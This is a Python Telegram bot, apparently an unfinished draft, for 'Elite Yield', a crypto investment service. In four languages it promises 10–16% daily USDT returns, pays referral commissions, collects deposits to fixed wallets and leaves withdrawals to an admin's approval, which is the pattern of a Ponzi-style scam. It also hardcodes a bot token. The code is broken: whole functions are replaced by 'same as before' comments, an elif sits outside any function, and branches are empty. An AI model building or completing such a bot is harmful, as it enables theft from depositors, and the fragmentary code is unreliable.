import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
import sqlite3
import threading
import time
import logging
from datetime import datetime

# تنظیم لاگینگ
logging.basicConfig(filename='bot_log.txt', level=logging.INFO, format='%(asctime)s - %(message)s')

# توکن و تنظیمات
BOT_TOKEN = '8268425583:AAFkSCeYzXAU2gcyz-tZLSwpzVg0uZ061IU'  # توکن از BotFather
ADMIN_ID = 7989867522  # ID تلگرام خودت
ADMIN_USERNAME = '@YourAdminUsername'  # username ادمین

bot = telebot.TeleBot(BOT_TOKEN)

# دیتابیس
conn = sqlite3.connect('elite_yield.db', check_same_thread=False)
cursor = conn.cursor()
cursor.execute('''CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    username TEXT,
    balance REAL DEFAULT 0,
    total_profit REAL DEFAULT 0,
    level TEXT DEFAULT 'Bronze',
    last_profit_time INTEGER DEFAULT 0,
    referrer_id INTEGER DEFAULT NULL,
    created_at INTEGER DEFAULT 0,
    language TEXT DEFAULT 'en'
)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS pending_deposits (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    username TEXT,
    amount REAL,
    status TEXT DEFAULT 'pending',
    created_at INTEGER
)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS pending_withdraws (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    username TEXT,
    amount REAL,
    wallet_address TEXT,
    status TEXT DEFAULT 'pending',
    created_at INTEGER
)''')
conn.commit()

# دیکشنری زبان‌ها
languages = {
    'en': {
        'welcome': """🌟 Welcome to Elite Yield Bot! 🚀

Unlock up to 16% DAILY returns on your USDT investments! 💰

💎 Membership Levels:
• Bronze (10% daily) - $0-$99
• Silver (12% daily) - $100-$499  
• Gold (16% daily) - $500+

💳 Minimum deposit: $10 USDT
🌐 Networks: TRC20 or BEP20

Start earning passive income today! 📈""",
        'balance': """💰 Your Balance: ${balance:.2f} USDT
📈 Total Profit: ${total_profit:.2f} USDT
💎 Level: {level}
🔄 Next profit in: Calculating...""",
        'deposit_instructions': """💳 Deposit Instructions:

Send USDT to one of these addresses:
🌐 TRC20 (Tron): `{TRC20_WALLET}`
🌐 BEP20 (BSC): `{BEP20_WALLET}`

💡 Minimum: $10
⚠️ Only USDT - no other tokens!

After sending, click "Confirm Deposit" below:""",
        'enter_amount': '💸 Enter amount to withdraw (min $5):',
        'invalid_amount': '❌ Invalid amount or insufficient balance!',
        'enter_wallet': 'Enter your wallet address (TRC20/BEP20):',
        'withdraw_submitted': '✅ Withdrawal request submitted! Waiting for admin approval...',
        'referral_text': """👥 Your Referral Link:
`{ref_link}`

📊 Referrals: {ref_count}
💰 Earn 5% commission on their deposits!

Share and earn passive income! 🎁""",
        'admin_panel': """🛠 Admin Panel
👥 Total Users: {total_users}
⏳ Pending Requests: Check below""",
        'users_list': '🏆 Top 10 Users by Balance:\n\n{users_text}',
        'pending_deposits': '💳 Pending Deposits:\n\n',
        'pending_withdraws': '\n💸 Pending Withdrawals:\n\n',
        'support': """📞 Support:
👤 Admin: {ADMIN_USERNAME}
🆔 ID: {ADMIN_ID}

Contact for issues or questions!""",
        'choose_language': 'Choose your language / زبان خود را انتخاب کنید / Dilinizi seçin / اختر لغتك',
        'english': 'English 🇺🇸',
        'persian': 'Persian 🇮🇷',
        'turkish': 'Turkish 🇹🇷',
        'arabic': 'Arabic 🇸🇦'
    },
    'fa': {
        'welcome': """🌟 خوش آمدید به Elite Yield Bot! 🚀

بازدهی تا 16% روزانه روی سرمایه USDT خود را باز کنید! 💰

💎 سطوح عضویت:
• برنز (10% روزانه) - $0-$99
• نقره‌ای (12% روزانه) - $100-$499  
• طلایی (16% روزانه) - $500+

💳 حداقل واریز: 10$ USDT
🌐 شبکه‌ها: TRC20 یا BEP20

از امروز درآمد غیرفعال کسب کنید! 📈""",
        'balance': """💰 موجودی شما: ${balance:.2f} USDT
📈 سود کل: ${total_profit:.2f} USDT
💎 سطح: {level}
🔄 سود بعدی در: محاسبه...""",
        'deposit_instructions': """💳 دستورالعمل واریز:

USDT را به یکی از آدرس‌ها ارسال کنید:
🌐 TRC20 (Tron): `{TRC20_WALLET}`
🌐 BEP20 (BSC): `{BEP20_WALLET}`

💡 حداقل: 10$
⚠️ فقط USDT - توکن دیگر نه!

پس از ارسال, "تأیید واریز" را کلیک کنید:""",
        'enter_amount': '💸 مبلغ برداشت را وارد کنید (حداقل 5$):',
        'invalid_amount': '❌ مبلغ نامعتبر یا موجودی ناکافی!',
        'enter_wallet': 'آدرس والت خود را وارد کنید (TRC20/BEP20):',
        'withdraw_submitted': '✅ درخواست برداشت ثبت شد! منتظر تأیید ادمین باشید...',
        'referral_text': """👥 لینک رفرال شما:
`{ref_link}`

📊 رفرال‌ها: {ref_count}
💰 5% کمیسیون از واریزهای آنها کسب کنید!

اشتراک بگذارید و درآمد غیرفعال کسب کنید! 🎁""",
        'admin_panel': """🛠 پنل ادمین
👥 کل کاربران: {total_users}
⏳ درخواست‌های در انتظار: زیر را چک کنید""",
        'users_list': '🏆 10 کاربر برتر بر اساس موجودی:\n\n{users_text}',
        'pending_deposits': '💳 واریزهای در انتظار:\n\n',
        'pending_withdraws': '\n💸 برداشت‌های در انتظار:\n\n',
        'support': """📞 پشتیبانی:
👤 ادمین: {ADMIN_USERNAME}
🆔 ID: {ADMIN_ID}

برای مشکلات تماس بگیرید!""",
        'choose_language': 'زبان خود را انتخاب کنید / Choose your language / Dilinizi seçin / اختر لغتك',
        'english': 'English 🇺🇸',
        'persian': 'فارسی 🇮🇷',
        'turkish': 'Türkçe 🇹🇷',
        'arabic': 'العربية 🇸🇦'
    },
    'tr': {
        'welcome': """🌟 Elite Yield Bot'a Hoş Geldiniz! 🚀

USDT yatırımlarınızda günlük %16'ya kadar getiri kilidini açın! 💰

💎 Üyelik Seviyeleri:
• Bronz (%10 günlük) - $0-$99
• Gümüş (%12 günlük) - $100-$499  
• Altın (%16 günlük) - $500+

💳 Minimum yatırım: $10 USDT
🌐 Ağlar: TRC20 veya BEP20

Bugün pasif gelir kazanmaya başlayın! 📈""",
        'balance': """💰 Bakiyeniz: ${balance:.2f} USDT
📈 Toplam Kar: ${total_profit:.2f} USDT
💎 Seviye: {level}
🔄 Sonraki kar: Hesaplanıyor...""",
        'deposit_instructions': """💳 Yatırım Talimatları:

USDT'yi şu adreslere gönderin:
🌐 TRC20 (Tron): `{TRC20_WALLET}`
🌐 BEP20 (BSC): `{BEP20_WALLET}`

💡 Minimum: $10
⚠️ Sadece USDT - diğer token yok!

Gönderdikten sonra "Yatırımı Onayla" tıklayın:""",
        'enter_amount': '💸 Çekmek istediğiniz miktarı girin (min $5):',
        'invalid_amount': '❌ Geçersiz miktar veya yetersiz bakiye!',
        'enter_wallet': 'Cüzdan adresinizi girin (TRC20/BEP20):',
        'withdraw_submitted': '✅ Çekim isteği gönderildi! Admin onayı bekleniyor...',
        'referral_text': """👥 Referans Linkiniz:
`{ref_link}`

📊 Referanslar: {ref_count}
💰 Yatırımlarından %5 komisyon kazanın!

Paylaşın ve pasif gelir kazanın! 🎁""",
        'admin_panel': """🛠 Admin Paneli
👥 Toplam Kullanıcı: {total_users}
⏳ Bekleyen İstekler: Aşağıyı kontrol edin""",
        'users_list': '🏆 Bakiyeye Göre En İyi 10 Kullanıcı:\n\n{users_text}',
        'pending_deposits': '💳 Bekleyen Yatırımlar:\n\n',
        'pending_withdraws': '\n💸 Bekleyen Çekimler:\n\n',
        'support': """📞 Destek:
👤 Admin: {ADMIN_USERNAME}
🆔 ID: {ADMIN_ID}

Sorunlar için iletişime geçin!""",
        'choose_language': 'Diliniz seçin / Choose your language / زبان خود را انتخاب کنید / اختر لغتك',
        'english': 'English 🇺🇸',
        'persian': 'فارسی 🇮🇷',
        'turkish': 'Türkçe 🇹🇷',
        'arabic': 'العربية 🇸🇦'
    },
    'ar': {
        'welcome': """🌟 مرحبا بك في Elite Yield Bot! 🚀

افتح عوائد يومية تصل إلى 16% على استثمارات USDT الخاصة بك! 💰

💎 مستويات العضوية:
• برونز (10% يومياً) - $0-$99
• فضي (12% يومياً) - $100-$499  
• ذهبي (16% يومياً) - $500+

💳 الحد الأدنى للإيداع: $10 USDT
🌐 الشبكات: TRC20 أو BEP20

ابدأ في كسب الدخل السلبي اليوم! 📈""",
        'balance': """💰 رصيدك: ${balance:.2f} USDT
📈 الربح الإجمالي: ${total_profit:.2f} USDT
💎 المستوى: {level}
🔄 الربح التالي في: يتم الحساب...""",
        'deposit_instructions': """💳 تعليمات الإيداع:

أرسل USDT إلى أحد هذه العناوين:
🌐 TRC20 (Tron): `{TRC20_WALLET}`
🌐 BEP20 (BSC): `{BEP20_WALLET}`

💡 الحد الأدنى: $10
⚠️ فقط USDT - لا توكنات أخرى!

بعد الإرسال, اضغط "تأكيد الإيداع": """,
        'enter_amount': '💸 أدخل المبلغ للسحب (حد أدنى $5):',
        'invalid_amount': '❌ مبلغ غير صالح أو رصيد غير كاف!',
        'enter_wallet': 'أدخل عنوان محفظتك (TRC20/BEP20):',
        'withdraw_submitted': '✅ تم إرسال طلب السحب! انتظر موافقة الإدارة...',
        'referral_text': """👥 رابط الإحالة الخاص بك:
`{ref_link}`

📊 الإحالات: {ref_count}
💰 اربح 5% عمولة من إيداعاتهم!

شارك واكسب دخل سلبي! 🎁""",
        'admin_panel': """🛠 لوحة الإدارة
👥 إجمالي المستخدمين: {total_users}
⏳ الطلبات المعلقة: تحقق أدناه""",
        'users_list': '🏆 أفضل 10 مستخدمين حسب الرصيد:\n\n{users_text}',
        'pending_deposits': '💳 الإيداعات المعلقة:\n\n',
        'pending_withdraws': '\n💸 السحوبات المعلقة:\n\n',
        'support': """📞 الدعم:
👤 الإدارة: {ADMIN_USERNAME}
🆔 ID: {ADMIN_ID}

اتصل للمشكلات!""",
        'choose_language': 'اختر لغتك / Choose your language / زبان خود را انتخاب کنید / Dilinizi seçin',
        'english': 'English 🇺🇸',
        'persian': 'فارسی 🇮🇷',
        'turkish': 'Türkçe 🇹🇷',
        'arabic': 'العربية 🇸🇦'
    }
}

# آدرس والت‌های ثابت
TRC20_WALLET = "TQzZgrHNtG9i8mGufpvW12sxFuy"  # والت TRC20 واقعی خودت
BEP20_WALLET = "0x7485e33695b722aA071A868bb6959533a3e449b02E"  # والت BEP20 واقعی خودت

# تابع get_level (همون قبلی)

# تابع main_menu (بدون تغییر, فقط btn_support نگه دار)

# تابع admin_menu (همون)

# تابع language_menu (همون)

# هندلر /start (همون, با fallback lang = 'en' اگر None)

# هندلر انتخاب زبان (همون)

# هندلر منو (همون, با support بدون channel)

elif message.text == '📞 Support':
    text = languages[lang]['support'].format(ADMIN_USERNAME=ADMIN_USERNAME, ADMIN_ID=ADMIN_ID)
    bot.send_message(message.chat.id, text, reply_markup=main_menu(is_admin, lang), parse_mode='Markdown')

# بقیه هندلرها (Deposit, Withdraw, Referral, Admin) همون

# فرآیند واریز/برداشت (همون)

# callback_handler با try/except برای safety
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    try:
        data = call.data
        if data.startswith('deposit_confirm_'):
            parts = data.split('_')
            target_user_id = int(parts[2])
            amount = float(parts[3])
            username = cursor.execute('SELECT username FROM users WHERE user_id = ?', (target_user_id,)).fetchone()[0]
            
            current_time = int(time.time())
            cursor.execute('INSERT INTO pending_deposits (user_id, username, amount, created_at) VALUES (?, ?, ?, ?)',
                          (target_user_id, username, amount, current_time))
            deposit_id = cursor.lastrowid
            conn.commit()
            
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton('✅ Confirm', callback_data=f'admin_confirm_dep_{deposit_id}'),
                      InlineKeyboardButton('❌ Reject', callback_data=f'admin_reject_dep_{deposit_id}'))
            
            admin_msg = f"💳 New Deposit: User {username} (ID: {target_user_id})\nAmount: ${amount}"
            bot.send_message(ADMIN_ID, admin_msg, reply_markup=markup)
            
            bot.answer_callback_query(call.id, "✅ Request sent!")
            bot.edit_message_text("✅ Submitted! Wait for admin.", call.message.chat.id, call.message.message_id)
        
        elif data.startswith('admin_confirm_dep_'):
            # همون کد قبلی
            
        elif data.startswith('admin_reject_dep_'):
            # همون
            
        # مشابه برای withdraw...
    except Exception as e:
        logging.error(f"Callback error: {e}")
        bot.answer_callback_query(call.id, "Error! Try again.")

# فرآیند پخش و بکاپ (همون)

# اجرای ربات
if __name__ == '__main__':
    print("🚀 Elite Yield Bot starting...")
    bot.polling(none_stop=True)
